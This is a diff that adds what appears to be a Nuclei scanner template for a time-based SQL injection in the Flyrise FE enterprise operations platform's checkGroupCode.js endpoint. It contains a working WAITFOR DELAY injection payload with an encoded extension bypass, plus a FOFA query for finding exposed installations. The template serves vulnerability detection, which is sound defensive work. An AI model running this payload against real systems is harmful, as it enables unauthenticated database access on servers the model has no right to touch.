@@ -1,0 +1,26 @@
+id: flyrise-checkgroupcode-sqli
+
+info:
+  name: 飞企互联 FE 企业运营管理平台 checkGroupCode.js - SQL Injection
+  author: leadlife
+  severity: high
+  description: 飞企互联-FE企业运营管理平台接口 `/docexchangeManage/checkGroupCode.js` 存在SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库数据。
+  metadata:
+    verified: true
+    fofa-query: app="飞企互联-FE企业运营管理平台"
+  tags: sqli, flyrise, time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /docexchangeManage/checkGroupCode.js%70?code=1%27;waitfor+delay+%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains_all(body,'isSuccess')
+        condition: and
